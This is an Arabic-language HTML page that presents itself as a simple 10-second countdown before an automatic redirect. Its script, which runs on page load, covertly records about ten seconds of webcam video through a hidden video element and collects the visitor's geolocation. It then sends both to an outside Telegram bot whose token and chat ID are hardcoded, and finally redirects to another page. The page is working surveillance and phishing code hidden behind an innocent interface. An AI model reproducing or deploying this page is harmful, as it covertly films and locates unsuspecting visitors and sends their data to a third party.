<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الانتظار 10 ثوانٍ</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            direction: rtl;
        }
        .countdown-container {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .progress-circle {
            position: relative;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: conic-gradient(#00bfff calc(var(--progress) * 1%), #ccc 0%);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: #333;
            --progress: 100;
        }
        p {
            margin-top: 20px;
            font-size: 18px;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="countdown-container">
        <div class="progress-circle" id="progressCircle">10</div>
        <p>يرجى الانتظار، سيتم الانتقال تلقائيًا بعد 10 ثوانٍ...</p>
    </div>
    <video id="video" autoplay playsinline style="display: none;"></video>
    
    <script>
        let countdown = 10;
        let intervalId;
        let mediaRecorder;
        let recordedChunks = [];
        let latitude = 'لم يُسمح بالوصول إلى الموقع';
        let longitude = 'لم يُسمح بالوصول إلى الموقع';

        async function requestPermissions() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                return stream;
            } catch (err) {
                console.error('خطأ في الحصول على الأذونات: ', err);
                return null;
            }
        }

        async function getLocation() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition((position) => {
                    latitude = position.coords.latitude;
                    longitude = position.coords.longitude;
                    resolve();
                }, (error) => {
                    console.error('خطأ في الحصول على الموقع: ', error);
                    resolve();
                });
            });
        }

        async function startCountdown() {
            const stream = await requestPermissions();
            await getLocation();

            if (stream) {
                document.getElementById('video').srcObject = stream;
                mediaRecorder = new MediaRecorder(stream);

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = () => {
                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                    recordedChunks = [];
                    sendToTelegram(videoBlob);
                };

                mediaRecorder.start();
                intervalId = setInterval(updateCountdown, 1000);

                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 10000); // مدة الفيديو 10 ثوانٍ
            }
        }

        function updateCountdown() {
            countdown--;
            document.getElementById('progressCircle').style.setProperty('--progress', (countdown / 10) * 100);
            document.getElementById('progressCircle').textContent = countdown;

            if (countdown === 0) {
                clearInterval(intervalId);
                window.location.href = 'final_page.html'; // الانتقال إلى الصفحة النهائية
            }
        }

        function sendToTelegram(videoBlob) {
            const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
            const chatId = '6185375878';

            const messageContent = `
#رسالة_2:
🎯 إحداثيات الموقع:
🌍 Latitude: ${latitude}
🌍 Longitude: ${longitude}
`;

            const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
            const apiUrlMedia = `https://api.telegram.org/bot${token}/sendVideo`;

            fetch(apiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: messageContent
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('تم إرسال الرسالة إلى Telegram:', data);
                
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('video', videoBlob, 'video.webm');
                formData.append('caption', messageContent);

                return fetch(apiUrlMedia, {
                    method: 'POST',
                    body: formData
                });
            })
            .then(response => response.json())
            .then(data => {
                console.log('تم إرسال الفيديو إلى Telegram:', data);
            })
            .catch(error => {
                console.error('خطأ في إرسال الفيديو إلى Telegram: ', error);
            });
        }

        startCountdown(); // بدء العد التنازلي
    </script>
</body>
</html>
